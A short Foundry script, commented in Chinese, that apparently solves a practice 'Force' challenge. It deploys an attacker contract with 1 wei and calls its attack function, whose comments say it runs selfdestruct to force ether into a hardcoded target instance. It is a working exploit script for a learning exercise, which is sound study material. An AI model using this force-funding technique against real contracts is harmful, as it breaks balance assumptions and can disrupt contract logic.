// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/ForceAttacker.sol";

contract ForceSolve is Script {
    function run() external {
        // 從環境變數讀取 Private Key
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // --- 填入你的實例地址 ---
        address payable forceAddress = payable(0x9c6B5EA1c0789A8a2a54F742943F81f9674674DA);

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約，並在部署時轉入 1 wei (或其他極小金額)
        // 這是因為 ForceAttacker 的 constructor 是 payable
        ForceAttacker attacker = new ForceAttacker{value: 1 wei}();

        console.log("Attacker deployed at:", address(attacker));
        console.log("Attacker balance:", address(attacker).balance);

        // 2. 呼叫 attack 函數，執行 selfdestruct
        attacker.attack(forceAddress);

        console.log("Selfdestruct executed. Force contract balance should be > 0.");

        vm.stopBroadcast();
    }
}
